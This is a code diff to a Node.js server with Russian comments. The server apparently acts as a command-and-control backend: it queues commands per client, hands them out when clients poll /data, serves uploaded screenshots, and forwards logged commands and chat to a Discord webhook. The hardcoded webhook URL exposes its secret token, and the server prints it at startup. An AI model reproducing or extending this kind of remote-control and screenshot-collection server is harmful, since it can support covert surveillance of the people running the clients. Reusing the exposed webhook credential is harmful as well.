@@ -1,8 +1,8 @@
 const http = require('http');
 const fetch = require('node-fetch');
 
-let lastCommand = "";
-let lastArgs = [];
+// Хранилище команд для каждого клиента
+let clientCommands = new Map();
 let lastScreenshot = null;
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";
 
@@ -32,15 +32,36 @@ async function sendDiscordMessage(title, description, color = 0x3498db, fields =
 
 const server = http.createServer((req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
     res.setHeader('Content-Type', 'application/json');
+    
+    // Handle preflight
+    if (req.method === 'OPTIONS') {
+        res.writeHead(200);
+        res.end();
+        return;
+    }
     
     if (req.method === 'POST' && req.url === '/command') {
         let body = '';
         req.on('data', chunk => body += chunk);
         req.on('end', async () => {
             try {
-                const { command, args } = JSON.parse(body);
+                const { command, args, clientId = 'default' } = JSON.parse(body);
+                console.log(`📨 Получена команда: ${command} от ${clientId}`);
                 
+                // Сохраняем команду для клиента
+                if (!clientCommands.has(clientId)) {
+                    clientCommands.set(clientId, []);
+                }
+                
+                clientCommands.get(clientId).push({
+                    command: command,
+                    args: args || [],
+                    timestamp: Date.now()
+                });
+
                 // Логирование команд в Discord
                 if (command === "user_chat") {
                     await sendDiscordMessage(
@@ -83,14 +104,42 @@ const server = http.createServer((req, res) => {
                     );
                 }
 
-                lastCommand = command;
-                lastArgs = args || [];
-                res.end(JSON.stringify({ status: "OK" }));
+                res.end(JSON.stringify({ 
+                    status: "OK",
+                    message: `Команда ${command} принята`
+                }));
             } catch (e) {
+                console.error('Ошибка обработки команды:', e);
                 res.statusCode = 400;
-                res.end(JSON.stringify({ error: "Invalid request" }));
+                res.end(JSON.stringify({ error: "Invalid request", details: e.message }));
             }
         });
+        return;
+    }
+
+    if (req.method === 'GET' && req.url === '/data') {
+        const clientId = req.headers['client-id'] || 'default';
+        
+        console.log(`📡 Клиент ${clientId} запрашивает команды`);
+        
+        if (clientCommands.has(clientId) && clientCommands.get(clientId).length > 0) {
+            const commands = clientCommands.get(clientId);
+            const nextCommand = commands.shift(); // Берем первую команду из очереди
+            
+            console.log(`📤 Отправка команды ${nextCommand.command} клиенту ${clientId}`);
+            
+            res.end(JSON.stringify({
+                command: nextCommand.command,
+                args: nextCommand.args,
+                timestamp: nextCommand.timestamp
+            }));
+        } else {
+            // Нет команд для этого клиента
+            res.end(JSON.stringify({
+                command: "",
+                args: []
+            }));
+        }
         return;
     }
 
@@ -108,6 +157,16 @@ const server = http.createServer((req, res) => {
                 res.end(JSON.stringify({ error: "Invalid screenshot data" }));
             }
         });
+        return;
+    }
+
+    if (req.method === 'GET' && req.url === '/screenshot') {
+        if (lastScreenshot) {
+            res.end(JSON.stringify({ image: lastScreenshot }));
+        } else {
+            res.statusCode = 404;
+            res.end(JSON.stringify({ error: "No screenshot available" }));
+        }
         return;
     }
 
@@ -165,33 +224,30 @@ const server = http.createServer((req, res) => {
         return;
     }
 
-    if (req.method === 'GET' && req.url === '/screenshot') {
-        if (lastScreenshot) {
-            res.end(JSON.stringify({ image: lastScreenshot }));
-        } else {
-            res.statusCode = 404;
-            res.end(JSON.stringify({ error: "No screenshot available" }));
-        }
-        return;
-    }
-
-    if (req.method === 'GET' && req.url === '/data') {
-        res.end(JSON.stringify({
-            command: lastCommand,
-            args: lastArgs
-        }));
-        lastCommand = "";
-        return;
-    }
-
     // Статус сервера
     if (req.method === 'GET' && req.url === '/status') {
+        const totalCommands = Array.from(clientCommands.values()).reduce((sum, cmds) => sum + cmds.length, 0);
+        
         res.end(JSON.stringify({
             status: "online",
             version: "2.4.0",
             timestamp: new Date().toISOString(),
-            commands_processed: lastCommand ? 1 : 0
+            clients: clientCommands.size,
+            pending_commands: totalCommands
         }));
+        return;
+    }
+
+    // Очистка старых команд (каждые 10 минут)
+    if (req.method === 'POST' && req.url === '/cleanup') {
+        const now = Date.now();
+        const tenMinutes = 10 * 60 * 1000;
+        
+        for (let [clientId, commands] of clientCommands) {
+            clientCommands.set(clientId, commands.filter(cmd => now - cmd.timestamp < tenMinutes));
+        }
+        
+        res.end(JSON.stringify({ status: "Cleanup completed" }));
         return;
     }
 
@@ -199,8 +255,26 @@ const server = http.createServer((req, res) => {
     res.end(JSON.stringify({ error: "Not Found" }));
 });
 
+// Периодическая очистка старых команд
+setInterval(() => {
+    const now = Date.now();
+    const tenMinutes = 10 * 60 * 1000;
+    let cleaned = 0;
+    
+    for (let [clientId, commands] of clientCommands) {
+        const originalLength = commands.length;
+        clientCommands.set(clientId, commands.filter(cmd => now - cmd.timestamp < tenMinutes));
+        cleaned += originalLength - clientCommands.get(clientId).length;
+    }
+    
+    if (cleaned > 0) {
+        console.log(`🧹 Очищено ${cleaned} старых команд`);
+    }
+}, 5 * 60 * 1000); // Каждые 5 минут
+
 server.listen(process.env.PORT || 3000, () => {
     console.log("🚀 Сервер запущен на порту 3000");
     console.log("📊 Версия: 2.4.0");
     console.log("🔗 Webhook: " + WEBHOOK_URL);
+    console.log("✅ Готов к приему команд от клиентов");
 });
